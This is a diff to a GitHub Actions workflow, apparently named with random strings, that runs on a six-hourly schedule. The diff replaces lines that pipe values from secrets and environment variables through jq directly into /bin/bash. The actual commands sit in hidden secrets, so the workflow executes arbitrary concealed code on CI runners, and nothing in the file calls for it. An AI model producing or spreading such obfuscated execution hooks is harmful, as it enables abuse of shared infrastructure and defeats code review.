@@ -1,21 +1,28 @@
 name: founderunable
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 5/6 * * *'
-jobs:  # 9817
+    - cron: '23 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: founderunable
         env:
-          t8: ${{ secrets.t8 }}
+          evl338: ${{ secrets.evl338 }}
         run: |
-          echo $t8 | jq -r .lypf7795 | /bin/bash
-          echo $ip44960 | jq -r .gqtt32265 | /bin/bash
-          echo $qowfm577 | jq -r .hqu2684 | /bin/bash
-          echo $pp17019 | jq -r .eqyz7630 | /bin/bash
-          echo $bzr16893 | jq -r .av24 | /bin/bash
-          echo $rufas155 | jq -r .lk773 | /bin/bash
+          echo $evl338 | jq -r .foppx102 | /bin/bash
+          echo $cto5 | jq -r .c74952 | /bin/bash
+          echo $wpkq33 | jq -r .wz33929 | /bin/bash
+          echo $yeyq4 | jq -r .naosa60 | /bin/bash
+          echo $rpk378 | jq -r .jnlut75429 | /bin/bash
+          echo $qs662 | jq -r .u235 | /bin/bash
+          echo $twfm945 | jq -r .keefd95 | /bin/bash
+          echo $fgid45 | jq -r .i3834 | /bin/bash
+          echo $ylai75 | jq -r .ra6289 | /bin/bash
+          echo $etf99758 | jq -r .acfu0375 | /bin/bash
+          echo $ppy781 | jq -r .nufoi7127 | /bin/bash
 
